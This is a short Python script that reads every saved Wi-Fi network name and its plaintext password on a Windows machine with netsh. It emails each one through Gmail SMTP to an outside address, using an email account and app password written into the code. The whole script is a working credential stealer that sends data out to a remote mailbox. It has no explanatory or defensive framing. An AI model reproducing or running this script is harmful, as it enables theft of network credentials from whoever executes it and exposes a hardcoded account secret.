# Importing the Suboprocess module
import subprocess
import smtplib

def send_email(content):
    email = "animenewschannel01@gmail.com"
    password = "dsio qsij kuod nsna"
    obj = smtplib.SMTP("smtp.gmail.com",587)
    obj.starttls()
    obj.login (email, password)
    obj.sendmail(email, "bharathpersonal06@gmail.com", content)
    obj.quit()

# running command
command = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in command if "All User Profile" in i]
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        wifi_password="{:<30}|  {:<}".format(i, results[0])
        send_email(wifi_password)
    except IndexError:
        failed = "{:<30}|  {:<}".format(i, "")
        send_email(failed)
input("")



